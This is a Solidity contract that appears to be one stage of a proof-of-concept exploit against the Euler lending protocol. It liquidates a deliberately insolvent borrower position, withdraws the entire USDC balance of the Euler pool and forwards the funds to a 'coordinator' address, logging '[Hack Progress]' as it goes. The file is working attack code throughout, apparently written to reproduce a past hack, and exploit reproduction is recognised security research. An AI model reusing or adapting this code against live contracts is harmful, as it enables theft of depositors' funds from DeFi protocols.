// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "../interfaces/ILiquidation.sol";
import { EulerProtocol } from "../attack.sol";
import { EthereumTokens } from "./tokens/Tokens.sol";
import "../console/console.sol";

contract Liquidator {

    function liquidate(
        address coordinator,
        uint256 initialBalance
    ) external {

        // Assuming caller is `BadBorrower`
        address target = msg.sender;
    
        ILiquidation.LiquidationOpportunity memory returnData =
            EulerProtocol.liquidation.checkLiquidation(address(this), target, address(EthereumTokens.USDC), address(EthereumTokens.USDC));

        EulerProtocol.liquidation.liquidate({
            target: msg.sender,
            underlying: address(EthereumTokens.USDC),
            collateral: address(EthereumTokens.USDC),
            repay: returnData.repay,
            maxWithdraw: returnData.yield - 1
        });

        console.log("[Hack Progress] | Liquidated bad loan...");
        console.log(
            "\t[Borrower] Collateral: %d eUSDC | Debt: %d dUSDC",
            EulerProtocol.eUSDC.balanceOf(target) / 10**EulerProtocol.eUSDC.decimals(),
            EulerProtocol.dUSDC.balanceOf(target) / 10**EulerProtocol.dUSDC.decimals()
        );
        console.log(
            "\t[Liquidator] Collateral: %d eUSDC | Debt: %d dUSDC | Profit: %d",
            EulerProtocol.eUSDC.balanceOf(address(this)) / 10**EulerProtocol.eUSDC.decimals(),
            EulerProtocol.dUSDC.balanceOf(address(this)) / 10**EulerProtocol.dUSDC.decimals(),
            EulerProtocol.eUSDC.balanceOf(address(this)) / 10**EulerProtocol.eUSDC.decimals() - EulerProtocol.dUSDC.balanceOf(address(this)) / 10**EulerProtocol.dUSDC.decimals()
        );

        console.log();

        console.log(
            "[Hack Progress] | Withdrawing %d USDC from Euler pool",
            EthereumTokens.USDC.balanceOf(EulerProtocol.euler) / 10**6 - initialBalance
        );

        // Burn eUSDC and get USDC in return
        uint256 amount = EthereumTokens.USDC.balanceOf(EulerProtocol.euler);
        EulerProtocol.eUSDC.withdraw(0, amount);

        assert(EthereumTokens.USDC.balanceOf(address(this)) >= amount);
        
        // Tranasfer all USDC to the coordinator
        EthereumTokens.USDC.transfer(coordinator, EthereumTokens.USDC.balanceOf(address(this)));
    }
}